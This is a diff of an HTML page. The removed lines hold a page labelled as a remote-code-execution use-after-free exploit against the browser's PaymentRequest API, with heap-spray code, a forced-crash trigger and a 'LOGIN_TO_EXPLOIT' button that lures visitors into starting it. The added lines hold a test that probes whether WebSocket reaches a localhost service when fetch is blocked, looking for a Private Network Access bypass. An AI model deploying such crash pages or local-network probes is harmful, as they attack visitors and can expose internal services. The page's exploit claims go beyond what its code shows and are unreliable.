@@ -1,118 +1,89 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="origin-trial" content="AhZhHzjW3uZQKFgy5j8L95nczseQoQWfYAGohnznjVckZbVqzp5z6XG/zw3dbPlTXO2Hvg8hwInJWfpdJ+dT4gEAAACDeyJvcmlnaW4iOiJodHRwczovL2x1bWJhci1icmljay1zb3VwLmdsaXRjaC5tZTo0NDMiLCJmZWF0dXJlIjoiU2VjdXJlUGF5bWVudENvbmZpcm1hdGlvblYyIiwiZXhwaXJ5IjoxNjMxNjYzOTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
-    <title>⚡ V23: UAF_5S_BLAST ⚡</title>
-    <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; overflow: hidden; }
-        #timer { font-size: 48px; color: #ff0000; margin: 20px; font-weight: bold; }
-        .log-box { border: 1px solid #333; height: 150px; overflow: hidden; font-size: 10px; text-align: left; padding: 10px; margin: 10px; }
-        .btn-start { background: #ff0000; color: #fff; padding: 20px; border: none; width: 80%; font-weight: bold; border-radius: 10px; }
-    </style>
+<meta charset="utf-8">
+<title>PNA Inconsistency Test</title>
 </head>
-<body>
-
-    <h1>⚡ RCE_UAF_TRIGGER ⚡</h1>
-    <div id="timer">05.00</div>
-    <button id="mainBtn" class="btn-start" onclick="startCountdown()">LOGIN_TO_EXPLOIT</button>
-
-    <div class="log-box" id="log">Awaiting user interaction...</div>
+<body style="font-family:monospace;">
+<h2>PNA Inconsistency Test (Fetch vs WebSocket)</h2>
+<pre id="log"></pre>
 
 <script>
-    let timeLeft = 500; // 5.00 seconds
-    let sprayContainer = [];
-    const logDiv = document.getElementById('log');
-    const timerDiv = document.getElementById('timer');
+const logEl = document.getElementById("log");
+const log = (msg) => logEl.textContent += msg + "\n";
 
-    function log(m) {
-        const d = document.createElement('div');
-        d.innerText = `[UAF_CORE] > ${m}`;
-        logDiv.prepend(d);
+const TARGET = "127.0.0.1:3000";
+
+// --- TEST 1: FETCH ---
+async function testFetch() {
+    log("=== FETCH TEST ===");
+    try {
+        const res = await fetch(`http://${TARGET}`, {
+            mode: "cors"
+        });
+        log("[FETCH] SUCCESS (unexpected if PNA enforced)");
+    } catch (e) {
+        log("[FETCH] BLOCKED (expected PNA behavior)");
+        log("Error: " + e.message);
     }
+}
 
-    // --- 1. MEMORY PREPARATION (UAF PRIMITIVE) ---
-    function prepareUAF() {
-        log("Grooming_V8_Heap_Region...");
-        const methodData = [{
-            supportedMethods: "secure-payment-confirmation",
-            data: {
-                action: "authenticate",
-                credentialIds: [new Uint8Array(16)],
-                networkData: new Uint8Array(16),
-                timeout: 60000,
-                payeeOrigin: window.location.origin,
-                rpId: window.location.hostname
-            }
-        }];
-        const details = { total: { label: "Total", amount: { currency: "USD", value: "0.01" } } };
+// --- TEST 2: WEBSOCKET ---
+function testWebSocket() {
+    return new Promise((resolve) => {
+        log("\n=== WEBSOCKET TEST ===");
 
-        // Membuat objek PaymentRequest yang akan kita hancurkan
-        window.vuln_obj = new PaymentRequest(methodData, details);
-        window.vuln_obj.show().catch(() => log("UAF_READY: OBJECT_FREED"));
-        
-        // Segera batalkan agar masuk ke state "Freed" di memori C++
-        window.vuln_obj.abort();
-    }
-
-    // --- 2. THE 5-SECOND SPRAY (REPLACING THE FREED OBJECT) ---
-    function executeTimedSpray() {
-        log("Executing_Replacement_Spray...");
-        // Kita menyemprotkan ribuan Uint32Array untuk menempati lokasi 
-        // yang tadinya milik vuln_obj
-        for (let i = 0; i < 3000; i++) {
-            let ab = new ArrayBuffer(1024);
-            let view = new BigUint64Array(ab);
-            // 0xdeadbeef adalah pointer palsu untuk memicu crash saat dereference
-            view.fill(0xdeadbeefdeadbeefn); 
-            sprayContainer.push(ab);
-        }
-    }
-
-    // --- 3. FINAL TRIGGER (THE SNAP) ---
-    function triggerFullSnap() {
-        log("Triggering_Final_Dereference...");
-        // Memaksa browser mengakses kembali objek yang sudah dihancurkan
+        let ws;
         try {
-            window.vuln_obj.canMakePayment().then(() => {
-                // Jika masih hidup, paksa crash via stack overflow
-                location.reload();
-            });
-        } catch(e) {
-            // Jika UAF berhasil, browser akan 'Aw, Snap!' sebelum catch ini terpanggil
+            ws = new WebSocket(`ws://${TARGET}`);
+        } catch (e) {
+            log("[WS] INIT ERROR: " + e.message);
+            resolve();
+            return;
         }
-        
-        // Backup: Memicu alokasi ilegal untuk menjamin "Aw, Snap!"
-        new Array(2**31 - 1);
-    }
 
-    // --- COUNTDOWN ORCHESTRATOR ---
-    function startCountdown() {
-        document.getElementById('mainBtn').disabled = true;
-        document.getElementById('mainBtn').innerText = "EXPLOITING...";
-        
-        // Langkah 1: Siapkan celah memori
-        prepareUAF();
+        let connected = false;
 
-        const timer = setInterval(() => {
-            timeLeft--;
-            let sec = (timeLeft / 100).toFixed(2);
-            timerDiv.innerText = sec;
+        ws.onopen = () => {
+            connected = true;
+            log("[WS] CONNECTED (POTENTIAL PNA BYPASS)");
+            ws.send("ping");
+            ws.close();
+        };
 
-            // Langkah 2: Di detik ke-3 (tengah jalan), kita lakukan spraying masif
-            if (timeLeft === 250) {
-                executeTimedSpray();
+        ws.onerror = () => {
+            if (!connected) {
+                log("[WS] BLOCKED (expected if protected)");
             }
+        };
 
-            // Langkah 3: Di detik 0, picu akses ilegal (The Snap)
-            if (timeLeft <= 0) {
-                clearInterval(timer);
-                triggerFullSnap();
-                if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
+        ws.onclose = () => {
+            log("[WS] CLOSED");
+            resolve();
+        };
+
+        // timeout safety
+        setTimeout(() => {
+            if (!connected) {
+                log("[WS] TIMEOUT (likely blocked)");
+                resolve();
             }
-        }, 10);
-    }
+        }, 3000);
+    });
+}
+
+// --- RUN TEST ---
+(async () => {
+    log("Target: " + TARGET);
+    log("Origin: " + location.origin);
+    log("Starting tests...\n");
+
+    await testFetch();
+    await testWebSocket();
+
+    log("\n=== RESULT ===");
+    log("If FETCH = blocked AND WS = connected => INCONSISTENCY");
+})();
 </script>
 </body>
 </html>
